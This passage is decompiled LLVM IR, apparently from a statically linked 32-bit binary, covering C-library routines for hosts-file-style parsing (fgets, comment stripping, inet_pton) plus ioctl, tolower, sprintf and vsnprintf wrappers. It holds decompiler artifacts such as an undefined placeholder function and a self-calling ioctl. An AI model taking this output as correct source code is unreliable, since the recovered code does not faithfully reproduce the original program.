  %v0_804dd1f = load i32, i32* %edx.global-to-local, align 4
  %v2_804dd1f = inttoptr i32 %arg8 to i32*
  store i32 %v0_804dd1f, i32* %v2_804dd1f, align 4
  br label %dec_label_pc_804de7d

dec_label_pc_804dd4d:                             ; preds = %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge, %dec_label_pc_804dc7f
  %v1_804dd51.pre-phi = phi i32* [ %.pre, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v1_804dc1e, %dec_label_pc_804dc7f ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v4_804dc8f, %dec_label_pc_804dc7f ]
  %stack_var_-20.0.in = phi i32 [ %v1_804dc07, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v0_804dc8b, %dec_label_pc_804dc7f ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v1_804dc07, %dec_label_pc_804dc7f ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v0_804dc87, %dec_label_pc_804dc7f ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v0_804dc72, %dec_label_pc_804dc7f ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_804dc02.dec_label_pc_804dd4d_crit_edge ], [ %v1_804dc4b, %dec_label_pc_804dc7f ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_804dd51.pre-phi, align 4
  %v12_804dddb = icmp eq i32 %arg4, 2
  %v4_804de06 = inttoptr i32 %arg2 to i8*
  %v12_804de19 = icmp eq i32 %arg3, 2
  %v12_804de3b = icmp eq i32 %arg3, 10
  %v1_804dde5 = icmp eq i1 %v12_804dddb, false
  %v1_804de1e = icmp eq i1 %v12_804de19, false
  %v1_804de40 = icmp eq i1 %v12_804de3b, false
  br label %dec_label_pc_804de63.outer

dec_label_pc_804de63.outer:                       ; preds = %dec_label_pc_804de3b, %dec_label_pc_804de42, %dec_label_pc_804de20, %dec_label_pc_804dd4d
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_804dd4d ], [ 2, %dec_label_pc_804de20 ], [ 2, %dec_label_pc_804de42 ], [ 2, %dec_label_pc_804de3b ]
  br label %dec_label_pc_804de63

dec_label_pc_804dd64:                             ; preds = %dec_label_pc_804de63
  %v3_804dd6c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_804dd6c, i32* @eax, align 4
  %v1_804dd74 = icmp eq i32 %v3_804dd6c, 0
  br i1 %v1_804dd74, label %dec_label_pc_804dd7b, label %dec_label_pc_804dd78

dec_label_pc_804dd78:                             ; preds = %dec_label_pc_804dd64
  %v1_804dd78 = inttoptr i32 %v3_804dd6c to i8*
  store i8 0, i8* %v1_804dd78, align 1
  br label %dec_label_pc_804dd7b

dec_label_pc_804dd7b:                             ; preds = %dec_label_pc_804dd64, %dec_label_pc_804dd78
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804ddbb34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_804ddbb35 = icmp eq i8 %v2_804ddbb34, 0
  %v1_804ddbe41 = icmp eq i1 %v3_804ddbb35, false
  br i1 %v1_804ddbe41, label %dec_label_pc_804dd87.preheader.preheader, label %dec_label_pc_804ddc0

dec_label_pc_804dd87.preheader.preheader:         ; preds = %dec_label_pc_804dd7b
  %v4_804dd8798.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804dd87.preheader

dec_label_pc_804dd83:                             ; preds = %dec_label_pc_804dd8d
  store i8 0, i8* %v1_804dd87104, align 1
  %v0_804dd86 = load i32, i32* @ecx, align 4
  %v1_804dd86 = add i32 %v0_804dd86, 1
  store i32 %v1_804dd86, i32* @ecx, align 4
  %v1_804dd87 = inttoptr i32 %v1_804dd86 to i8*
  %v2_804dd87 = load i8, i8* %v1_804dd87, align 1
  %v3_804dd87 = zext i8 %v2_804dd87 to i32
  %v4_804dd87 = load i32, i32* %eax.global-to-local, align 4
  %v5_804dd87 = and i32 %v4_804dd87, -256
  %v6_804dd87 = or i32 %v5_804dd87, %v3_804dd87
  store i32 %v6_804dd87, i32* @eax, align 4
  %v4_804dd89 = icmp eq i8 %v2_804dd87, 0
  br i1 %v4_804dd89, label %dec_label_pc_804dd87.dec_label_pc_804ddc0.loopexit_crit_edge, label %dec_label_pc_804dd8d

dec_label_pc_804dd8d:                             ; preds = %dec_label_pc_804dd87.preheader, %dec_label_pc_804dd83
  %v2_804dd87105 = phi i8 [ %v2_804dd87, %dec_label_pc_804dd83 ], [ %v2_804dd8796, %dec_label_pc_804dd87.preheader ]
  %v1_804dd87104 = phi i8* [ %v1_804dd87, %dec_label_pc_804dd83 ], [ %v1_804dd8795, %dec_label_pc_804dd87.preheader ]
  %v0_804dd83103 = phi i32 [ %v1_804dd86, %dec_label_pc_804dd83 ], [ %v0_804dd8749, %dec_label_pc_804dd87.preheader ]
  %v2_804dd8d = sext i8 %v2_804dd87105 to i32
  store i32 %v2_804dd8d, i32* @edx, align 4
  %v0_804dd90 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804dd90, i32* %eax.global-to-local, align 4
  %v2_804dd95 = mul nsw i32 %v2_804dd8d, 2
  %v3_804dd95 = add i32 %v0_804dd90, %v2_804dd95
  %v4_804dd95 = inttoptr i32 %v3_804dd95 to i8*
  %v5_804dd95 = load i8, i8* %v4_804dd95, align 1
  %v6_804dd95 = and i8 %v5_804dd95, 32
  %v7_804dd95 = icmp eq i8 %v6_804dd95, 0
  %v1_804dd99 = icmp eq i1 %v7_804dd95, false
  br i1 %v1_804dd99, label %dec_label_pc_804dd83, label %dec_label_pc_804dd9b

dec_label_pc_804dd9b:                             ; preds = %dec_label_pc_804dd8d
  %v0_804dd9b = load i32, i32* @edi, align 4
  %v1_804dd9b = add i32 %v0_804dd9b, -6
  %v6_804dd9b = sub i32 5, %v0_804dd9b
  %v7_804dd9b = and i32 %v6_804dd9b, %v0_804dd9b
  %v8_804dd9b = icmp slt i32 %v7_804dd9b, 0
  %v9_804dd9b = icmp eq i32 %v1_804dd9b, 0
  %v10_804dd9b = icmp slt i32 %v1_804dd9b, 0
  %v3_804dd9e = icmp eq i1 %v10_804dd9b, %v8_804dd9b
  %v4_804dd9e = icmp eq i1 %v9_804dd9b, false
  %v5_804dd9e = and i1 %v4_804dd9e, %v3_804dd9e
  br i1 %v5_804dd9e, label %dec_label_pc_804dda7.preheader, label %dec_label_pc_804dda0

dec_label_pc_804dda0:                             ; preds = %dec_label_pc_804dd9b
  %v1_804dda0 = load i32, i32* @ebx, align 4
  %v3_804dda0 = mul i32 %v0_804dd9b, 4
  %v4_804dda0 = add i32 %v1_804dda0, %v3_804dda0
  %v5_804dda0 = inttoptr i32 %v4_804dda0 to i32*
  store i32 %v0_804dd83103, i32* %v5_804dda0, align 4
  %v0_804dda3 = load i32, i32* @edi, align 4
  %v1_804dda3 = add i32 %v0_804dda3, 1
  store i32 %v1_804dda3, i32* @edi, align 4
  %v0_804dda7.pre.pre = load i32, i32* @ecx, align 4
  %v4_804dda7.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dda7.preheader

dec_label_pc_804dda7.preheader:                   ; preds = %dec_label_pc_804dda0, %dec_label_pc_804dd9b
  %v4_804dda7.pre = phi i32 [ %v4_804dda7.pre.pre, %dec_label_pc_804dda0 ], [ %v0_804dd90, %dec_label_pc_804dd9b ]
  %v0_804dda7.pre = phi i32 [ %v0_804dda7.pre.pre, %dec_label_pc_804dda0 ], [ %v0_804dd83103, %dec_label_pc_804dd9b ]
  %v0_804ddc054 = phi i32 [ %v1_804dda3, %dec_label_pc_804dda0 ], [ %v0_804dd9b, %dec_label_pc_804dd9b ]
  %v1_804dda7106 = inttoptr i32 %v0_804dda7.pre to i8*
  %v2_804dda7107 = load i8, i8* %v1_804dda7106, align 1
  %v3_804dda7108 = zext i8 %v2_804dda7107 to i32
  %v5_804dda7109 = and i32 %v4_804dda7.pre, -256
  %v6_804dda7110 = or i32 %v3_804dda7108, %v5_804dda7109
  store i32 %v6_804dda7110, i32* @eax, align 4
  %v4_804dda9111 = icmp eq i8 %v2_804dda7107, 0
  br i1 %v4_804dda9111, label %dec_label_pc_804ddbb.loopexit, label %dec_label_pc_804ddad.lr.ph

dec_label_pc_804ddad.lr.ph:                       ; preds = %dec_label_pc_804dda7.preheader
  %v0_804ddb0.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804ddad

dec_label_pc_804dda6:                             ; preds = %dec_label_pc_804ddad
  %v1_804dda6 = add i32 %v0_804ddbb113, 1
  store i32 %v1_804dda6, i32* @ecx, align 4
  %v1_804dda7 = inttoptr i32 %v1_804dda6 to i8*
  %v2_804dda7 = load i8, i8* %v1_804dda7, align 1
  %v3_804dda7 = zext i8 %v2_804dda7 to i32
  %v5_804dda7 = and i32 %v0_804ddb0.pre, -256
  %v6_804dda7 = or i32 %v3_804dda7, %v5_804dda7
  store i32 %v6_804dda7, i32* @eax, align 4
  %v4_804dda9 = icmp eq i8 %v2_804dda7, 0
  br i1 %v4_804dda9, label %dec_label_pc_804ddbb.loopexit, label %dec_label_pc_804ddad

dec_label_pc_804ddad:                             ; preds = %dec_label_pc_804ddad.lr.ph, %dec_label_pc_804dda6
  %v2_804dda7115 = phi i8 [ %v2_804dda7107, %dec_label_pc_804ddad.lr.ph ], [ %v2_804dda7, %dec_label_pc_804dda6 ]
  %v1_804dda7114 = phi i8* [ %v1_804dda7106, %dec_label_pc_804ddad.lr.ph ], [ %v1_804dda7, %dec_label_pc_804dda6 ]
  %v0_804ddbb113 = phi i32 [ %v0_804dda7.pre, %dec_label_pc_804ddad.lr.ph ], [ %v1_804dda6, %dec_label_pc_804dda6 ]
  %v2_804ddad = sext i8 %v2_804dda7115 to i32
  store i32 %v2_804ddad, i32* @edx, align 4
  store i32 %v0_804ddb0.pre, i32* @eax, align 4
  %v2_804ddb5 = mul nsw i32 %v2_804ddad, 2
  %v3_804ddb5 = add i32 %v0_804ddb0.pre, %v2_804ddb5
  %v4_804ddb5 = inttoptr i32 %v3_804ddb5 to i8*
  %v5_804ddb5 = load i8, i8* %v4_804ddb5, align 1
  %v6_804ddb5 = and i8 %v5_804ddb5, 32
  %v7_804ddb5 = icmp eq i8 %v6_804ddb5, 0
  br i1 %v7_804ddb5, label %dec_label_pc_804dda6, label %dec_label_pc_804ddbb.loopexit

dec_label_pc_804ddbb.loopexit:                    ; preds = %dec_label_pc_804ddad, %dec_label_pc_804dda6, %dec_label_pc_804dda7.preheader
  %v4_804dd8798135 = phi i32 [ %v6_804dda7110, %dec_label_pc_804dda7.preheader ], [ %v6_804dda7, %dec_label_pc_804dda6 ], [ %v0_804ddb0.pre, %dec_label_pc_804ddad ]
  %v0_804ddbb.lcssa = phi i32 [ %v0_804dda7.pre, %dec_label_pc_804dda7.preheader ], [ %v1_804dda6, %dec_label_pc_804dda6 ], [ %v0_804ddbb113, %dec_label_pc_804ddad ]
  %v1_804dda7.lcssa = phi i8* [ %v1_804dda7106, %dec_label_pc_804dda7.preheader ], [ %v1_804dda7, %dec_label_pc_804dda6 ], [ %v1_804dda7114, %dec_label_pc_804ddad ]
  %v2_804ddbb = load i8, i8* %v1_804dda7.lcssa, align 1
  %v3_804ddbb = icmp eq i8 %v2_804ddbb, 0
  %v1_804ddbe = icmp eq i1 %v3_804ddbb, false
  br i1 %v1_804ddbe, label %dec_label_pc_804dd87.preheader, label %dec_label_pc_804ddc0

dec_label_pc_804dd87.preheader:                   ; preds = %dec_label_pc_804dd87.preheader.preheader, %dec_label_pc_804ddbb.loopexit
  %v0_804ddc0.pre138 = phi i32 [ %v0_804ddc054, %dec_label_pc_804ddbb.loopexit ], [ 0, %dec_label_pc_804dd87.preheader.preheader ]
  %v4_804dd8798 = phi i32 [ %v4_804dd8798135, %dec_label_pc_804ddbb.loopexit ], [ %v4_804dd8798.pre, %dec_label_pc_804dd87.preheader.preheader ]
  %v0_804dd8749 = phi i32 [ %v0_804ddbb.lcssa, %dec_label_pc_804ddbb.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_804dd87.preheader.preheader ]
  %v1_804dd8795 = inttoptr i32 %v0_804dd8749 to i8*
  %v2_804dd8796 = load i8, i8* %v1_804dd8795, align 1
  %v3_804dd8797 = zext i8 %v2_804dd8796 to i32
  %v5_804dd8799 = and i32 %v4_804dd8798, -256
  %v6_804dd87100 = or i32 %v5_804dd8799, %v3_804dd8797
  store i32 %v6_804dd87100, i32* @eax, align 4
  %v4_804dd89101 = icmp eq i8 %v2_804dd8796, 0
  br i1 %v4_804dd89101, label %dec_label_pc_804ddc0, label %dec_label_pc_804dd8d

dec_label_pc_804dd87.dec_label_pc_804ddc0.loopexit_crit_edge: ; preds = %dec_label_pc_804dd83
  %v0_804ddc0.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804ddc0

dec_label_pc_804ddc0:                             ; preds = %dec_label_pc_804ddbb.loopexit, %dec_label_pc_804dd87.dec_label_pc_804ddc0.loopexit_crit_edge, %dec_label_pc_804dd87.preheader, %dec_label_pc_804dd7b
  %v1_804ddc3 = phi i32 [ 0, %dec_label_pc_804dd7b ], [ %v0_804ddc0.pre.pre, %dec_label_pc_804dd87.dec_label_pc_804ddc0.loopexit_crit_edge ], [ %v0_804ddc0.pre138, %dec_label_pc_804dd87.preheader ], [ %v0_804ddc054, %dec_label_pc_804ddbb.loopexit ]
  %v0_804ddc3 = load i32, i32* @ebx, align 4
  %v2_804ddc3 = mul i32 %v1_804ddc3, 4
  %v3_804ddc3 = add i32 %v0_804ddc3, %v2_804ddc3
  %v4_804ddc3 = inttoptr i32 %v3_804ddc3 to i32*
  store i32 0, i32* %v4_804ddc3, align 4
  %v7_804ddca = icmp sgt i32 %v1_804ddc3, 1
  br i1 %v7_804ddca, label %dec_label_pc_804ddd0, label %dec_label_pc_804de63

dec_label_pc_804ddd0:                             ; preds = %dec_label_pc_804ddc0
  br i1 %v12_804dc02, label %dec_label_pc_804de9d, label %dec_label_pc_804dddb

dec_label_pc_804dddb:                             ; preds = %dec_label_pc_804ddd0
  store i32 1, i32* @esi, align 4
  br i1 %v1_804dde5, label %dec_label_pc_804de13.preheader, label %dec_label_pc_804dde7

dec_label_pc_804de13.preheader:                   ; preds = %dec_label_pc_804dddb
  %v1_804de13119 = load i32, i32* @edi, align 4
  %v5_804de15124 = icmp sgt i32 %v1_804de13119, 1
  br i1 %v5_804de15124, label %dec_label_pc_804ddfd.lr.ph, label %dec_label_pc_804de63

dec_label_pc_804ddfd.lr.ph:                       ; preds = %dec_label_pc_804de13.preheader
  %v0_804ddfd.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804ddfd

dec_label_pc_804dde7:                             ; preds = %dec_label_pc_804dddb
  %v0_804dde7 = load i32, i32* @eax, align 4
  %v0_804dde9 = load i32, i32* @ebx, align 4
  %v1_804dde9 = inttoptr i32 %v0_804dde9 to i32*
  %v2_804dde9 = load i32, i32* %v1_804dde9, align 4
  %v5_804ddef = call i32 @__GI_strcoll(i8* %v4_804de06, i32 %v2_804dde9, i32 %v0_804dde7, i32 %v0_804dde7)
  store i32 %v5_804ddef, i32* %eax.global-to-local, align 4
  %v1_804ddf7 = icmp eq i32 %v5_804ddef, 0
  %v1_804ddf9 = icmp eq i1 %v1_804ddf7, false
  br i1 %v1_804ddf9, label %dec_label_pc_804de63, label %dec_label_pc_804de19

dec_label_pc_804ddfd:                             ; preds = %dec_label_pc_804ddfd.lr.ph, %dec_label_pc_804de12
  %v0_804ddfd = phi i32 [ %v0_804ddfd.pre, %dec_label_pc_804ddfd.lr.ph ], [ %v5_804de06, %dec_label_pc_804de12 ]
  %v1_804ddff125 = phi i32 [ 1, %dec_label_pc_804ddfd.lr.ph ], [ %v1_804de12, %dec_label_pc_804de12 ]
  %v0_804ddff = load i32, i32* @ebx, align 4
  %v2_804ddff = mul i32 %v1_804ddff125, 4
  %v3_804ddff = add i32 %v0_804ddff, %v2_804ddff
  %v4_804ddff = inttoptr i32 %v3_804ddff to i32*
  %v5_804ddff = load i32, i32* %v4_804ddff, align 4
  %v5_804de06 = call i32 @__GI_strcasecmp(i8* %v4_804de06, i32 %v5_804ddff, i32 %v0_804ddfd, i32 %v0_804ddfd)
  store i32 %v5_804de06, i32* %eax.global-to-local, align 4
  %v1_804de0e = icmp eq i32 %v5_804de06, 0
  br i1 %v1_804de0e, label %dec_label_pc_804de19, label %dec_label_pc_804de12

dec_label_pc_804de12:                             ; preds = %dec_label_pc_804ddfd
  %v0_804de12 = load i32, i32* @esi, align 4
  %v1_804de12 = add i32 %v0_804de12, 1
  store i32 %v1_804de12, i32* @esi, align 4
  %v1_804de13 = load i32, i32* @edi, align 4
  %v5_804de15 = icmp slt i32 %v1_804de12, %v1_804de13
  br i1 %v5_804de15, label %dec_label_pc_804ddfd, label %dec_label_pc_804de63

dec_label_pc_804de19:                             ; preds = %dec_label_pc_804dde7, %dec_label_pc_804ddfd
  br i1 %v1_804de1e, label %dec_label_pc_804de3b, label %dec_label_pc_804de20

dec_label_pc_804de20:                             ; preds = %dec_label_pc_804de19
  %v0_804de20 = load i32, i32* @esi, align 4
  %v3_804de21 = load i8*, i8** %stack_var_-44, align 4
  %v4_804de21 = ptrtoint i8* %v3_804de21 to i32
  %v0_804de25 = load i32, i32* @ebx, align 4
  %v1_804de25 = inttoptr i32 %v0_804de25 to i32*
  %v2_804de25 = load i32, i32* %v1_804de25, align 4
  %v4_804de29 = inttoptr i32 %v2_804de25 to i8*
  %v5_804de29 = call i32 @inet_pton(i32 2, i8* %v4_804de29, i32 %v4_804de21, i32 %v0_804de20)
  store i32 %v5_804de29, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_804de29, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_804dcb9, label %dec_label_pc_804de63.outer

dec_label_pc_804de3b:                             ; preds = %dec_label_pc_804de19
  br i1 %v1_804de40, label %dec_label_pc_804de63.outer, label %dec_label_pc_804de42

dec_label_pc_804de42:                             ; preds = %dec_label_pc_804de3b
  %v0_804de42 = load i32, i32* @ecx, align 4
  %v0_804de47 = load i32, i32* @ebx, align 4
  %v1_804de47 = inttoptr i32 %v0_804de47 to i32*
  %v2_804de47 = load i32, i32* %v1_804de47, align 4
  %v4_804de4b = inttoptr i32 %v2_804de47 to i8*
  %v5_804de4b = call i32 @inet_pton(i32 10, i8* %v4_804de4b, i32 %stack_var_-36.0, i32 %v0_804de42)
  store i32 %v5_804de4b, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_804de4b, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_804dce6, label %dec_label_pc_804de63.outer

dec_label_pc_804de63:                             ; preds = %dec_label_pc_804de13.preheader, %dec_label_pc_804de12, %dec_label_pc_804ddc0, %dec_label_pc_804dde7, %dec_label_pc_804de63.outer
  %v0_804de63 = load i32, i32* @edx, align 4
  %v3_804de6d = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_804de63)
  store i32 %v3_804de6d, i32* @eax, align 4
  %v1_804de75 = icmp eq i32 %v3_804de6d, 0
  %v1_804de77 = icmp eq i1 %v1_804de75, false
  br i1 %v1_804de77, label %dec_label_pc_804dd64, label %dec_label_pc_804de7d

dec_label_pc_804de7d:                             ; preds = %dec_label_pc_804de63, %dec_label_pc_804dd12
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_804dd12 ], [ %stack_var_-28.0.ph, %dec_label_pc_804de63 ]
  br i1 %v12_804dc02, label %dec_label_pc_804de9d, label %dec_label_pc_804de84

dec_label_pc_804de84:                             ; preds = %dec_label_pc_804de7d
  %v1_804de8b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_804de8b = call i32 @__GI_fclose(i16* %v1_804de8b)
  store i32 %v2_804de8b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804de9d

dec_label_pc_804de9d:                             ; preds = %dec_label_pc_804ddd0, %dec_label_pc_804dbed, %dec_label_pc_804dbf9, %dec_label_pc_804dc17, %dec_label_pc_804dc2a, %dec_label_pc_804dc36, %dec_label_pc_804dc3f, %dec_label_pc_804dc69, %dec_label_pc_804de7d, %dec_label_pc_804de84, %dec_label_pc_804dc9f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804de7d ], [ %stack_var_-28.1, %dec_label_pc_804de84 ], [ %v2_804dcae, %dec_label_pc_804dc9f ], [ 34, %dec_label_pc_804dc69 ], [ 34, %dec_label_pc_804dc3f ], [ 34, %dec_label_pc_804dc36 ], [ 34, %dec_label_pc_804dc2a ], [ 34, %dec_label_pc_804dc17 ], [ 34, %dec_label_pc_804dbf9 ], [ 34, %dec_label_pc_804dbed ], [ %stack_var_-28.0.ph, %dec_label_pc_804ddd0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_804dbd8, i32* @ebx, align 4
  store i32 %v0_804dbd7, i32* @esi, align 4
  store i32 %v0_804dbd6, i32* @edi, align 4
  store i32 %v0_804dbd5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_804de12, { 0, 2, 1 }
  uselistorder i32 %v5_804de06, { 1, 2, 0 }
  uselistorder i32 %v0_804ddfd, { 1, 0 }
  uselistorder i32 %v1_804ddc3, { 1, 0 }
  uselistorder i8 %v2_804dd8796, { 1, 2, 0 }
  uselistorder i8* %v1_804dd8795, { 1, 0 }
  uselistorder i32 %v0_804dd8749, { 1, 0 }
  uselistorder i32 %v2_804ddad, { 1, 0 }
  uselistorder i32 %v1_804dda6, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ddb0.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_804dd9b, { 1, 0 }
  uselistorder i32 %v0_804dd9b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804dd8d, { 1, 0 }
  uselistorder i8* %v4_804de06, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804dc4b, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dc2a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804dc07, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804dc0e, { 1, 0 }
  uselistorder i32 %v1_804dbe8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804de9d, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804de63, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_804de19, { 1, 0 }
  uselistorder label %dec_label_pc_804ddfd, { 1, 0 }
  uselistorder label %dec_label_pc_804ddc0, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804dd87.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804ddad, { 1, 0 }
  uselistorder label %dec_label_pc_804dd7b, { 1, 0 }
  uselistorder label %dec_label_pc_804de63.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804dd4d, { 1, 0 }
  uselistorder label %dec_label_pc_804dd12, { 1, 0 }
  uselistorder label %dec_label_pc_804dc69, { 1, 0 }
  uselistorder label %dec_label_pc_804dbf9, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804deac = load i32, i32* @edi, align 4
  store i32 %v0_804deac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804dec4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804decc = call i32 @ioctl(i32 %v0_804dec4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804dec4, i32* @ebx, align 4
  store i32 %v3_804decc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_804decc, -4095
  br i1 %tmp, label %dec_label_pc_804dee4, label %dec_label_pc_804ded8

dec_label_pc_804ded8:                             ; preds = %entry
  %v1_804ded8 = call i32 @__errno_location(i32 %v0_804dec4)
  %v0_804dedd = load i32, i32* %edi.global-to-local, align 4
  %v1_804dedd = sub i32 0, %v0_804dedd
  %v2_804dedf = inttoptr i32 %v1_804ded8 to i32*
  store i32 %v1_804dedd, i32* %v2_804dedf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dee4

dec_label_pc_804dee4:                             ; preds = %entry, %dec_label_pc_804ded8
  %v0_804dee7 = phi i32 [ %v3_804decc, %entry ], [ -1, %dec_label_pc_804ded8 ]
  %v2_804dee9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dee9, i32* @edi, align 4
  ret i32 %v0_804dee7

; uselistorder directives
  uselistorder i32 %v3_804decc, { 1, 0, 2 }
  uselistorder i32 %v0_804dec4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 1, 0 }
  uselistorder label %dec_label_pc_804dee4, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804def0 = add i32 %arg1, 128
  %v6_804defb = icmp ugt i32 %v1_804def0, 383
  br i1 %v6_804defb, label %dec_label_pc_804df06, label %dec_label_pc_804defd

dec_label_pc_804defd:                             ; preds = %entry
  %v0_804defd = load i32, i32* bitcast (i32** @global_var_80522d4.113 to i32*), align 4
  %v2_804df02 = mul i32 %arg1, 2
  %v3_804df02 = add i32 %v0_804defd, %v2_804df02
  %v4_804df02 = inttoptr i32 %v3_804df02 to i16*
  %v5_804df02 = load i16, i16* %v4_804df02, align 2
  %v6_804df02 = sext i16 %v5_804df02 to i32
  store i32 %v6_804df02, i32* @edx, align 4
  br label %dec_label_pc_804df06

dec_label_pc_804df06:                             ; preds = %entry, %dec_label_pc_804defd
  %v0_804df06 = phi i32 [ %arg1, %entry ], [ %v6_804df02, %dec_label_pc_804defd ]
  ret i32 %v0_804df06

; uselistorder directives
  uselistorder label %dec_label_pc_804df06, { 1, 0 }
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804df0f = ptrtoint i32* %stack_var_12 to i32
  %v4_804df22 = inttoptr i32 %arg1 to i8*
  %v5_804df22 = call i32 @__GI_vsnprintf(i8* %v4_804df22, i32 -1, i32 %arg2, i32 %v2_804df0f)
  ret i32 %v5_804df22
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804df2c = load i32, i32* @ebp, align 4
  %v0_804df2d = load i32, i32* @edi, align 4
  %v0_804df2e = load i32, i32* @esi, align 4
  %v0_804df2f = load i32, i32* @ebx, align 4
  store i32 %v0_804df2f, i32* %stack_var_-16, align 4
  %v4_804df33 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804df33, i32* @esi, align 4
  %v2_804df37 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804df42 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804df42, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804df5c = sub i32 -1, %v4_804df33
  %v1_804df6f = call i32 @__stdio_init_mutex(i32 %v2_804df37)
  %v1_804df7f = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804df5c, %v1_804df7f
  %v5_804df81 = select i1 %tmp, i32 %v1_804df5c, i32 %v1_804df7f
  store i32 %v5_804df81, i32* @ebx, align 4
  %v0_804df84 = load i32, i32* @esi, align 4
  %v3_804dfae = inttoptr i32 %arg3 to i8*
  %v4_804dfae = call i32 @_vfprintf_internal(i32 %v2_804df42, i8* %v3_804dfae, i32 %arg4)
